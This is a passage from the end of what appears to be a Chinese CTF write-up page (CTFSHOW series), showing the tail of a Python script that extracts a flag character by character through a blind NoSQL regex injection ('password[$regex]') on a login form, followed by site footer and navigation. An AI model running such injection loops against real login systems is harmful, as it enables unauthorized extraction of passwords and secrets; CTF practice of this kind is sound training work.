            <span class="token string">&quot;password[$regex]&quot;</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f&quot;ctfshow</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token operator">+</span>j<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span>
        <span class="token punctuation">}</span>
        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            sign<span class="token operator">=</span>j
            flag<span class="token operator">+=</span>j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    <span class="token keyword">if</span> sign<span class="token operator">==</span><span class="token string">'}'</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>end</p></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/Apursuit/Apursuit.github.io/edit/master/docs/01.wp/05.sql-script.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">最后一次更新于:</span> <span class="time">2025/10/08, 22:34:57</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/a11a87/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">CTFSHOW nodejs 334-338</div></a> <a href="/pages/0aec60/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">pwnable</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/a11a87/" class="prev">CTFSHOW nodejs 334-338</a></span> <span class="next"><a href="/pages/0aec60/">pwnable</a>→
      </span></p></div></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:admin@gmail.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/Apursuit" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2024-2025
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.285d429f.js" defer></script><script src="/assets/js/2.a5a506a3.js" defer></script><script src="/assets/js/9.7d02f968.js" defer></script>
  </body>
</html>
